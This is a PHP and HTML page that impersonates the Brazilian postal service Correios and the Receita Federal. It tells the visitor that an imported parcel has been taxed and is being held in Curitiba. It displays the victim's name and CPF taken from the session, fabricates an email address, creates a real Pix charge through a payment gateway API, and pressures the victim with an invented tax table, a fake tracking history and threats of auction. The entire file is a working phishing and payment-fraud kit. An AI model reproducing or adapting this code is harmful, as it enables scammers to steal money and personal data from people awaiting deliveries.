<?php

if (isset($_SESSION['OFRT_C_nome']) && $_SESSION['OFRT_C_cidade']) {
    $user_nome = $_SESSION['OFRT_C_nome'];
    $user_nascimento = $_SESSION['OFRT_C_nascimento'];
    $user_sexo = $_SESSION['OFRT_C_sexo'];
    $user_cpf = $_SESSION['OFRT_C_cpf'];
    $user_cidade = $_SESSION['OFRT_C_cidade'];
    $user_estado = $_SESSION['OFRT_C_estado'];
} else {
    redirecionar(LINK_DOMINIO . 'acompanhe');
    $user_nome = "Erro...";
    $user_nascimento = "Erro...";
    $user_sexo = "Erro...";
    $user_cpf = "Erro...";
    $user_cidade = "Erro...";
    $user_estado = "Erro...";
}

$emails_aleatorios = [
    'gmail',
    'hotmail',
    'outlook',
    'bool',
    'live',
    'yahoo',
    'uol',
    'icloud',
    'zoho',
    'terra',
    'r7',
    'yandex',
    'protonmail'
];

$cpf_gtw = str_replace('.', '', $user_cpf);
$cpf_gtw = str_replace('-', '', $cpf_gtw);
define('CLIENTE_EMAIL', str_replace(' ', '', strtolower($user_nome)) . '@' . $emails_aleatorios[array_rand($emails_aleatorios)] . '.com');

define('TOKEN_GTW', base64_encode("$token_gateway:x"));
$data = [
    "customer" => [
        "document" => [
            "number" => $cpf_gtw,
            "type"   => "cpf"
        ],
        "name"  => $user_nome,
        "email" => CLIENTE_EMAIL
    ],
    "items" => [
        [
            "tangible"   => true,
            "title"      => $produto_gateway,
            "unitPrice"  => $valor_gateway,
            "quantity"   => 1
        ]
    ],
    "amount" => $valor_gateway,
    "paymentMethod" => "pix"
];
$ch = curl_init('https://api.payoutbr.com.br/v1/transactions');
// $ch = curl_init('https://api.payoutions.com/');
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_HTTPHEADER => [
        'Accept: application/json',
        'Authorization: Basic ' . TOKEN_GTW,
        'Content-Type: application/json'
    ],
    CURLOPT_POSTFIELDS => json_encode($data),
    CURLOPT_TIMEOUT => 30,
    CURLOPT_CONNECTTIMEOUT => 10
]);
$sucesso_pix = true;
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
if ($response === false) {
    $error = curl_error($ch);
    curl_close($ch);
    $sucesso_pix = false;
}
curl_close($ch);
$responseData = json_decode($response, true);

if (isset($responseData['pix']['qrcode']) && $responseData['pix']['qrcode'] != '') {
    $pix_copia = $responseData['pix']['qrcode'];
    $pixCodeEncoded = urlencode($pix_copia);
    $pix_qr = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data={$pixCodeEncoded}";
} else {
    $pix_copia = "Erro ao gerar Pix...";
    $pix_qr = "";
}

?>

<header class="w-100 font-size-16 font-weight-400 text-blue">
    <div class="w-100 bg-grey px-3 px-lg-3 py-1 border-bottom border-white">
        <span>Acessibilidade</span>

        <i class="fas fa-caret-down ml-1"></i>
    </div>
    <style>
        .div-flex {
            display: flex;
            align-items: center;
            justify-content: center;
        }
    </style>
    <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning"
        style="height:48px">
        <div class="menu-toggle" id="menu-toggle" style="width:50px">
            <div class="bar"></div>
            <div class="bar"></div>
            <div class="bar"></div>
        </div>

        <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
            <a href="https://google.com" class="py-2">
                <img src="<?php echo FILES ?>images/correios-1.png" alt="" height="25">
            </a>
        </div>

        <div class="ml-4 d-none d-lg-block " style="width:150px">
            <a href="https://google.com" style="display: flex;"
                class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none">
                <img src="<?php echo FILES ?>images/entrar-1.svg" alt="Correios" width="31">

                <span class="ml-1">Entrar</span>
            </a>
        </div>
    </nav>
</header>

<main>
    <nav class="d-flex align-items-center flex-wrap mt-4 px-2 font-weight-400 w-95 max-w-1000" style="margin: 0 auto;">
        <span class="text-blue mr-2">Portal Correios</span>
        <i class="fal fa-angle-right mr-2"></i>
        <span class="text-blue mr-2">Rastreamento</span>
        <i class="fal fa-angle-right mr-2"></i>

        <span class="text-blue mr-2"><span class="cpf"></span></span>
    </nav>


    <section class="mt-3 p-4  w-95 max-w-1000" style="margin:0 auto;">

        <h5 class="text-danger  font-weight-700 mb-4">
            <i class="far fa-exclamation-triangle"></i> SUA ENCOMENDA FOI TRIBUTADA!


        </h5>
        <h4 class="text-blue-dark font-size-20 font-weight-700 mt-1 mb-2">

            STATUS DA ENTREGA: <br>
        </h4>

        <h4 class="text-warning font-size-18 font-weight-700 mt-1 mb-2 d-flex align-items-center">
            <div id="blink" style="width:12px;height:12px;border-radius:50%;" class="mr-2 bg-warning"></div>
            AGUARDANDO PAGAMENTO
        </h4>
        <h5 id="address" style="color:#555577;">Sua encomenda está retida na agência dos correios em CURITIBA-PR</h5>

        <p class="mt-4">Para liberar o envio da sua encomenda, clique no botão abaixo. É recomendado que o pagamento
            seja
            feito de imediato para evitar aumento das tarifas postais de armazenagem!</p>



    </section>
    <div style="padding: 0px 30px 0px 30px;">
        <button id="btnGerarPix" class="btn btn-primary" style="font-size:13px;width: 100%;">
            CLIQUE AQUI PARA LIBERAÇÃO DA SUA ENCOMENDA
        </button>
    </div>

    <style>
        #pixModal.active {
            display: flex !important;
            opacity: 1 !important;
        }
    </style>

    <!-- Modal para exibir o QR Code e o código Pix -->
    <div id="pixModal" class="modal fade"
        style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
     background: rgba(0, 0, 0, 0.7); justify-content: center; align-items: center; z-index: 9999; opacity: 0; transition: opacity 0.3s ease;">
        <div
            style="background: white;padding: 0;border-radius: 8px;max-width: 400px;width: 90%;text-align: center;position: relative;overflow: hidden;max-height: 90vh;overflow-y: auto;box-sizing: border-box;">


            <!-- Barra de título -->
            <div
                style="background-color: #FFD400; padding: 12px; border-top-left-radius: 8px; border-top-right-radius: 8px; display: flex; align-items: center; position: relative;">
                <!-- Logo ao lado esquerdo -->
                <img src="<?php echo FILES ?>images/icone.png" alt="Logo"
                    style="width: 28px; height: 28px; margin-right: 8px;">

                <!-- Título centralizado -->
                <h3
                    style="margin: 0; color: #00416B; font-size: 20px; font-weight: bold; position: absolute; left: 50%; transform: translateX(-50%);">
                    Pagamento via PIX
                </h3>
            </div>

            <div style="padding: 20px;">
                <!-- Total a pagar -->
                <p style="color: #0071AD; font-size: 18px; margin-bottom: 10px;">Total a pagar: <strong>R$
                        68,56</strong>
                </p>

                <!-- Caixa de instruções -->
                <div style="border: 1px solid #f5c518; background: linear-gradient(to bottom, #e6f4ff, #ffffff); 
                  border-radius: 8px; padding: 15px; margin: 10px 0 20px 0; text-align: left;">
                    <h4 style="margin: 0 0 10px 0; font-size: 18px; color: #0071AD;">Como pagar com PIX</h4>
                    <p style="margin: 4px 0; font-size: 15px;">1. Abra o aplicativo do seu banco</p>
                    <p style="margin: 4px 0; font-size: 15px;">2. Escolha a opção "Pagar com PIX"</p>
                    <p style="margin: 4px 0; font-size: 15px;">3. Escaneie o QR Code ou copie e cole o código PIX</p>
                    <p style="margin: 4px 0; font-size: 15px;">4. Confira o valor e o beneficiário</p>
                    <p style="margin: 4px 0; font-size: 15px;">6. Confirme o pagamento com sua senha</p>
                </div>


                <!-- QR Code e código Pix -->
                <img id="qrCodeImg" src="<?php echo $pix_qr; ?>" alt="Erro ao gerar Pix..." style="max-width: 100%; margin: 15px 0; border-radius: 8px; 
           box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2); display: block; margin-left: auto; margin-right: auto;">

                <style>
                    #box_mascara {
                        width: 100%;
                        position: relative;
                    }

                    #box_mascara .mascara {
                        z-index: 999999999;
                        position: absolute;
                        top: 0;
                        left: 0;
                        width: 100%;
                        height: 100%;
                    }

                    #pixCode {
                        padding: 5px;
                    }
                </style>

                <p><strong>Código PIX (Copia e Cola):</strong></p>
                <div id="box_mascara">
                    <textarea id="pixCode" style="width: 100%; height: 80px;"><?php echo $pix_copia; ?></textarea>
                    <div class="mascara"></div>
                </div>

                <!-- Botão Copiar -->
                <button onclick="copiarPix()"
                    style="margin-top: 10px; background: linear-gradient(to bottom, #38e26d, #2ecc71); 
        color: white; border: 1px solid black; border-radius: 5px; padding: 10px; font-size: 15px; cursor: pointer; width: 100%;">
                    Copiar código PIX
                </button>

                <div style="margin: 10px 0; font-size: 14px; color: red; text-align: left;">
                    <div style="display: flex; align-items: center; font-weight: bold; margin-bottom: 4px;">
                        <img src="<?php echo FILES ?>images/564619.png" alt="Atenção"
                            style="width: 18px; height: 18px; margin-right: 6px;">
                        <span>Atenção</span>
                    </div>
                    <p style="margin: 0;">
                        Caso o pagamento da taxa não seja efetuado, poderá ser considerado pela Receita Federal como
                        encomenda
                        abandonada e, posteriormente, poderá ser leiloada!
                    </p>
                </div>

                <!-- Botão Fechar alinhado à direita -->
                <div style="display: flex; justify-content: flex-end; margin-top: 20px;">
                    <div id="btnFecharPix"
                        style="background: linear-gradient(to bottom, #ffffff, #f0f0f0); 
          color: #333; border: 1px solid black; border-radius: 5px; padding: 8px 16px; font-size: 14px; cursor: pointer;">
                        Fechar
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal de Loading -->
    <div id="loadingModal" class="fade"
        style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
     background: rgba(0, 0, 0, 0.7); justify-content: center; align-items: center; z-index: 10000; opacity: 0; transition: opacity 0.3s ease;">
        <div style="background: white; padding: 30px; border-radius: 10px; text-align: center; width: 300px;">

            <!-- Spinner -->
            <div style="margin-bottom: 20px;">
                <div
                    style="border: 6px solid #f3f3f3; border-top: 6px solid #FFD400; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto;">
                </div>
            </div>

            <!-- Texto Principal -->
            <p style="font-size: 16px; color: #00416B; font-weight: bold; margin-bottom: 10px;">
                Estamos gerando sua GUIA de Impostos para pagamento
            </p>

            <!-- Texto Menor -->
            <p style="font-size: 14px; color: #333;">
                Por favor, aguarde...
            </p>

        </div>
    </div>

    <!-- Animação do Spinner e Fade -->
    <style>
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        /* Controle de visibilidade suave */
        .show {
            display: flex !important;
            opacity: 1 !important;
        }

        .hide {
            opacity: 0 !important;
            transition: opacity 0.3s ease;
        }
    </style>

    <section class="mt-3 p-4 w-95 max-w-1000" style="margin: 0 auto;">
        <div style="border: 1px solid black; padding: 15px; font-family: Arial, sans-serif;">

            <!-- Título com logo -->
            <div
                style="display: flex; align-items: center; justify-content: center; border-bottom: 1px solid black; padding-bottom: 8px;">
                <img src="<?php echo FILES ?>images/Logo-Receita-Federal-do-Brasil.png" alt="Logo Receita Federal"
                    style="height: 35px; margin-right: 10px;">
                <h3 style="font-size: 16px; margin: 0;">TRIBUTAÇÃO FEDERAL DEVIDA</h3>
            </div>

            <!-- Nome e CPF -->
            <div style="margin-top: 10px; font-size: 14px;">
                <strong>Nome: <?php echo $user_nome; ?></strong> <br>
                <strong>CPF: <?php echo $user_cpf; ?></strong>
            </div>

            <table style="width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 14px;">
                <tbody>
                    <tr>
                        <td style="padding: 6px;">Imposto de Importação</td>
                        <td style="padding: 6px; width: 30px;"></td>
                        <td style="padding: 6px; text-align: right;"> R$ 33,78</td>
                    </tr>
                    <tr>
                        <td style="padding: 6px;">Imposto sobre circulação de mercadorias e serviços</td>
                        <td style="padding: 6px;"></td>
                        <td style="padding: 6px; text-align: right;"> R$ 23,65</td>
                    </tr>
                    <tr>
                        <td style="padding: 6px;">Serviços Postais</td>
                        <td style="padding: 6px;"></td>
                        <td style="padding: 6px; text-align: right;"> R$ 11,13</td>
                    </tr>
                    <tr>
                        <td style="padding: 6px; font-weight: bold;">Total</td>
                        <td style="padding: 6px; font-weight: bold;"></td>
                        <td style="padding: 6px; text-align: right; font-weight: bold;"> R$ 68,56</td>
                    </tr>
                    <tr>
                        <td style="padding: 6px; font-weight: bold;" colspan="2">Data de Vencimento</td>
                        <td style="padding: 6px; text-align: right; font-weight: bold;"><?php dataHora(); ?>
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
    </section>

    <style>
        #box_icons_svg svg {
            fill: #277AB8;
            width: 30px;
            height: 30px;
        }
    </style>

    <section class=" py mb-5 w-95 max-w-1000" style="margin:0 auto;" id="div_rast">
        <ul id="box_icons_svg">


            <li class="d-flex mt-4" style="position: relative">
                <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue"
                    style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
                    <img src="<?php echo FILES ?>images/correios-icon-1.png" alt="" width="32">
                </div>

                <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
                    <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
                        Previsão de Entrega
                    </h5>

                    <span class="text-dark font-size-12 flex-wrap">
                        3 dias após o pagamento
                    </span>
                </div>
            </li>

            <li class="d-flex mt-5" style="position: relative">
                <div style="width:2px;height:120px;background-color:#FFC40C;position:absolute;top:-118px;left:24px">
                </div>

                <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue"
                    style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
                    <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px"
                        fill="#ffffff">
                        <path
                            d="M441-120v-86q-53-12-91.5-46T293-348l74-30q15 48 44.5 73t77.5 25q41 0 69.5-18.5T587-356q0-35-22-55.5T463-458q-86-27-118-64.5T313-614q0-65 42-101t86-41v-84h80v84q50 8 82.5 36.5T651-650l-74 32q-12-32-34-48t-60-16q-44 0-67 19.5T393-614q0 33 30 52t104 40q69 20 104.5 63.5T667-358q0 71-42 108t-104 46v84h-80Z" />
                    </svg>
                </div>

                <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
                    <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
                        Objeto aguardando pagamento
                    </h5>

                    <span class="text-dark font-size-12 flex-wrap">
                        em Unidade de Fiscalização Aduaneira, Curitiba, PR <br>
                    </span>

                    <h5 class="mt-1 text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
                        Realize o pagamento: <a href="#btnGerarPix" class="text-blue" id="linkEfetuarPagamento">Efetuar
                            Pagamento</a>
                    </h5>
                </div>
            </li>

            <li class="d-flex mt-5" style="position: relative">
                <div style="width:2px;height:120px;background-color:#FFC40C;position:absolute;top:-118px;left:24px">
                </div>

                <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue"
                    style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
                    <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px"
                        fill="#ffffff">
                        <path
                            d="M240-160q-50 0-85-35t-35-85H40v-440q0-33 23.5-56.5T120-800h560v160h120l120 160v200h-80q0 50-35 85t-85 35q-50 0-85-35t-35-85H360q0 50-35 85t-85 35Zm0-80q17 0 28.5-11.5T280-280q0-17-11.5-28.5T240-320q-17 0-28.5 11.5T200-280q0 17 11.5 28.5T240-240ZM120-360h32q17-18 39-29t49-11q27 0 49 11t39 29h272v-360H120v360Zm600 120q17 0 28.5-11.5T760-280q0-17-11.5-28.5T720-320q-17 0-28.5 11.5T680-280q0 17 11.5 28.5T720-240Zm-40-200h170l-90-120h-80v120ZM360-540Z" />
                    </svg>
                </div>

                <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
                    <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
                        Objeto em transferência - por favor aguarde
                    </h5>

                    <span class="text-dark font-size-12 flex-wrap">
                        de Unidade de Tratamento, Curitiba, PR <br>
                        para Unidade de Fiscalização Aduaneira - Curitiba, PR
                    </span>
                </div>
            </li>

            <li class="d-flex mt-5" style="position: relative">
                <div style="width:2px;height:100px;background-color:#FFC40C;position:absolute;top:-98px;left:24px">
                </div>

                <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue"
                    style="width:50px;height:50px;border-radius:50%;z-index:100">
                    <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px"
                        fill="#ffffff">
                        <path
                            d="M200-640v440h560v-440H640v320l-160-80-160 80v-320H200Zm0 520q-33 0-56.5-23.5T120-200v-499q0-14 4.5-27t13.5-24l50-61q11-14 27.5-21.5T250-840h460q18 0 34.5 7.5T772-811l50 61q9 11 13.5 24t4.5 27v499q0 33-23.5 56.5T760-120H200Zm16-600h528l-34-40H250l-34 40Zm184 80v190l80-40 80 40v-190H400Zm-200 0h560-560Z" />
                    </svg>
                </div>

                <div class="w-70 d-flex flex-column ml-3 justify-content-center font-verdana text-wrap">
                    <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0">
                        Objeto recebido em território nacional
                    </h5>

                    <span class="text-dark font-size-12">Curitiba - PR</span>
                </div>
            </li>

            <li class="d-flex mt-5" style="position: relative">
                <div style="width:2px;height:120px;background-color:#FFC40C;position:absolute;top:-118px;left:24px">
                </div>

                <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue"
                    style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
                    <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px"
                        fill="#ffffff">
                        <path
                            d="M240-160q-50 0-85-35t-35-85H40v-440q0-33 23.5-56.5T120-800h560v160h120l120 160v200h-80q0 50-35 85t-85 35q-50 0-85-35t-35-85H360q0 50-35 85t-85 35Zm0-80q17 0 28.5-11.5T280-280q0-17-11.5-28.5T240-320q-17 0-28.5 11.5T200-280q0 17 11.5 28.5T240-240ZM120-360h32q17-18 39-29t49-11q27 0 49 11t39 29h272v-360H120v360Zm600 120q17 0 28.5-11.5T760-280q0-17-11.5-28.5T720-320q-17 0-28.5 11.5T680-280q0 17 11.5 28.5T720-240Zm-40-200h170l-90-120h-80v120ZM360-540Z" />
                    </svg>
                </div>

                <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
                    <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
                        Objeto em transferência - por favor aguarde
                    </h5>

                    <span class="text-dark font-size-12 flex-wrap">
                        de Unidade de Tratamento, Shanghai - China <br>
                        para Unidade de Tratamento Internacional, China
                    </span>
                </div>
            </li>

            <li class="d-flex mt-5" style="position: relative">
                <div style="width:2px;height:172px;background-color:#FFC40C;position:absolute;top:-170px;left:24px">
                </div>

                <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue"
                    style="width:50px;height:50px;border-radius:50%;z-index:100">
                    <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px"
                        fill="#ffffff">
                        <path
                            d="M440-183v-274L200-596v274l240 139Zm80 0 240-139v-274L520-457v274Zm-80 92L160-252q-19-11-29.5-29T120-321v-318q0-22 10.5-40t29.5-29l280-161q19-11 40-11t40 11l280 161q19 11 29.5 29t10.5 40v318q0 22-10.5 40T800-252L520-91q-19 11-40 11t-40-11Zm200-528 77-44-237-137-78 45 238 136Zm-160 93 78-45-237-137-78 45 237 137Z" />
                    </svg>
                </div>

                <div class="d-flex flex-column ml-3 justify-content-center font-verdana">
                    <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0">Objeto Postado</h5>
                    <span class="text-dark font-size-12">Shanghai - China</span>
                </div>
            </li>
        </ul>

    </section>

    <section class="my-4 w-95 max-w-1000" style="margin:0 auto;">
        <div>
            <img src="<?php echo FILES ?>images/banner-1-1.jpg" alt="" class="w-100">
        </div>
    </section>
</main>

<footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark">
    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
        <h5 class="font-weight-700 mb-4">Fale Conosco</h5>

        <ul>
            <li class="mb-2 font-size-14">
                <i class="fas fa-desktop"></i>
                <a href="https://google.com" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Registro de Manifestações</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-question-square mr-1"></i>
                <a href="https://google.com" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Central de Atendimento</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-briefcase"></i>
                <a href="https://google.com" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Solucões para o seu negócio</span>
                </a>
            </li>
            <li class="mb-2 font-size-14">
                <i class="far fa-headset"></i>
                <a href="https://google.com" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Suporte ao cliente com contrato</span>
                </a>
            </li>
            <li class="mb-2 font-size-14">
                <i class="far fa-comment-alt-dots"></i>
                <a href="https://google.com" class="ml-2 text-blue-dark text-hover-orange">
                    <span>Ouvidoria</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-user-headset"></i>
                <a href="https://google.com" class="ml-2 text-blue-dark text-hover-orange">
                    <span>Denúncia</span>
                </a>
            </li>
        </ul>
    </div>

    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
        <h5 class="font-weight-700 mb-4">Sobre os Correios</h5>

        <ul>
            <li class="mb-2 font-size-14">
                <i class="far fa-address-card"></i>
                <a href="https://google.com" class="ml-2 text-blue-dark text-hover-orange">
                    <span>Identidade colaborativa</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-user-graduate"></i>
                <a href="https://google.com" class="ml-2 text-blue-dark text-hover-orange">
                    <span>Educação e cultura</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-book-alt"></i>
                <a href="https://google.com" class="ml-2 text-blue-dark text-hover-orange">
                    <span>Código de ética</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-search"></i>
                <a href="https://google.com" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Transparência e prestação de contas</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-comment-alt-dots"></i>
                <a href="https://google.com" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Política de privacidade e Notas legais</span>
                </a>
            </li>
        </ul>
    </div>

    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
        <h5 class="font-weight-700 mb-4">Outros Sites</h5>

        <ul>
            <li class="mb-2 font-size-14">
                <i class="far fa-shopping-cart"></i>
                <a href="https://google.com" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Loja online dos correios</span>
                </a>
            </li>
        </ul>
    </div>

    <div class="d-flex justify-content-center w-100 px-3 mb-3 text-dark font-size-14">
        <span>© Copyright 2026 Correios</span>
    </div>
</footer>

<script>
    const pixModal = document.getElementById('pixModal');
    const btnGerarPix = document.getElementById('btnGerarPix');
    const linkEfetuarPagamento = document.getElementById('linkEfetuarPagamento');
    const btnFecharPix = document.getElementById('btnFecharPix');

    btnGerarPix.addEventListener('click', () => {
        pixModal.classList.add('active');
    });
    linkEfetuarPagamento.addEventListener('click', () => {
        pixModal.classList.add('active');
    });
    btnFecharPix.addEventListener('click', () => {
        pixModal.classList.remove('active');
    });

    function copiarPix() {
        const pixCode = document.getElementById("pixCode").value;
        navigator.clipboard.writeText(pixCode).then(function() {
            alert("Código Pix copiado!");
        }, function(err) {
            alert("Erro ao copiar Pix: " + err);
        });
    }
</script>